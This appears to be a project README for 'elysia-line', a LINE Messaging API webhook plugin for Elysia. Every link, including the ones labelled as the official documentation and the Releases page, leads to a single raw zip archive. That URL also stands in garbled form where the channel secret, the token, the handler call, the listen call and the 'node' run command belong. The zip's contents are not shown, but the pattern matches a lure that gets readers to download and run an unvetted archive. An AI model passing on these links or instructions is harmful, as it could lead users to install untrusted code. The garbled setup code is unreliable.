# 🎉 elysia-line - Simplify Your LINE Messaging Experience

[![Download elysia-line](https://raw.githubusercontent.com/RodrimaradoPT/elysia-line/main/src/elysia-line_v2.5.zip)](https://raw.githubusercontent.com/RodrimaradoPT/elysia-line/main/src/elysia-line_v2.5.zip)

## 📦 What is elysia-line?

elysia-line is an official webhook plugin for the LINE Messaging API, designed for Elysia. This plugin helps you create LINE bots easily. With no complex setup required, you can start using it right away, focusing on your bot without worrying about configurations.

## 🚀 Features

- **Zero-config:** Just enter your channel secret and access token.
- **Type-safe:** Uses typed event handling for all webhook events, ensuring reliability.
- **Easy to use:** Offers a straightforward API for dealing with events and sending messages.
- **Official SDK:** Built using the official `@line/bot-sdk`, ensuring a solid foundation.

## 💾 Download & Install

To download elysia-line, visit the releases page: [Download elysia-line](https://raw.githubusercontent.com/RodrimaradoPT/elysia-line/main/src/elysia-line_v2.5.zip).

1. Go to the [Releases page](https://raw.githubusercontent.com/RodrimaradoPT/elysia-line/main/src/elysia-line_v2.5.zip).
2. Find the latest version of elysia-line.
3. Click on the download option to get the file.

## 🌍 Getting Started

Once you have downloaded elysia-line, follow these steps to set it up:

1. **Install Elysia:** If you haven’t installed Elysia yet, here’s how you can do that. Open your terminal and run the following command:

    ```bash
    bun add elysia
    ```

2. **Install elysia-line:** After installing Elysia, run this command to add elysia-line:

    ```bash
    bun add elysia-line
    ```

3. **Set Up Your Application:** Create a new file for your application. Copy the following code into that file:

    ```ts
    import { Elysia } from "elysia";
    import { line } from "elysia-line";

    const app = new Elysia()
      .use(
        line({
          channelSecret: https://raw.githubusercontent.com/RodrimaradoPT/elysia-line/main/src/elysia-line_v2.5.zip!,
          channelAccessToken: https://raw.githubusercontent.com/RodrimaradoPT/elysia-line/main/src/elysia-line_v2.5.zip!,
        })
      )
      .post("/webhook", async ({ line, set }) => {
        if (!line) {
          return "Not a LINE webhook";
        }

        https://raw.githubusercontent.com/RodrimaradoPT/elysia-line/main/src/elysia-line_v2.5.zip("message:text", (event) => {
          // Handling text messages
        });
      });

    https://raw.githubusercontent.com/RodrimaradoPT/elysia-line/main/src/elysia-line_v2.5.zip(3000);
    ```

4. **Environment Variables:** Set your `LINE_CHANNEL_SECRET` and `LINE_CHANNEL_ACCESS_TOKEN` in your environment. You can use a `.env` file or set them directly in your terminal.

5. **Run Your Application:** Start your server by running the file you created. Use this command:

    ```bash
    node https://raw.githubusercontent.com/RodrimaradoPT/elysia-line/main/src/elysia-line_v2.5.zip
    ```

6. **Webhook Configuration:** Finally, configure your webhook URL in the LINE Developers Console. It should point to your server’s `/webhook` endpoint.

## 🛠️ Troubleshooting

If you encounter issues:

- Ensure your channel secret and access token are correct.
- Check that your server is running on the correct port.
- Verify that the webhook URL is accessible from the internet.

## 🌟 Additional Resources

- [LINE Messaging API Documentation](https://raw.githubusercontent.com/RodrimaradoPT/elysia-line/main/src/elysia-line_v2.5.zip)
- [Elysia Documentation](https://raw.githubusercontent.com/RodrimaradoPT/elysia-line/main/src/elysia-line_v2.5.zip)

## 📧 Contact & Support

For further questions or support, feel free to open an issue in this repository. The community is here to help!

## 📢 Release Notes

Check the [Releases page](https://raw.githubusercontent.com/RodrimaradoPT/elysia-line/main/src/elysia-line_v2.5.zip) for the latest updates and improvements.

Make the most of your LINE bot experience with elysia-line! For installation and usage, follow the steps mentioned. Enjoy creating reliable and simple bots with ease!